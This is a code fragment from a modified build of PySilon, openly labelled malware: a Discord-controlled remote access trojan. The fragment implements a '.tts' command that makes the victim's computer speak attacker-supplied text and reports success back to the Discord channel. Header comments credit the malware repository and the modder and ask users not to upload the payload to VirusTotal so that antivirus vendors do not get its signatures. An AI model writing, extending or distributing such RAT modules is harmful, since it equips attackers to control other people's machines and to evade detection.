#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )

import pyttsx3
# end of imports

# on message
elif message.content[:4] == '.tts':
    #.log Message is "tts"
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.tts':
        #.log Author issued empty ".tts" command 
        embed = discord.Embed(title="📛 Error",description='```Syntax: .tts <what-to-say>```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent message with usage of ".tts" 
    else:
        requested_tts = message.content[5:]
        engine = pyttsx3.init()
        #.log Initialized pyttsx3 Text-to-Speech engine
        engine.say(requested_tts)
        #.log Registered requested tts message
        engine.runAndWait()
        #.log Run tts engine
        engine.stop()
        #.log Stopped tts engine
        embed = discord.Embed(title="🟢 Success",description=f'```Successfully played TTS message: "{requested_tts}"```', colour=discord.Colour.green())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent embed about successfully playing tts message

#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )
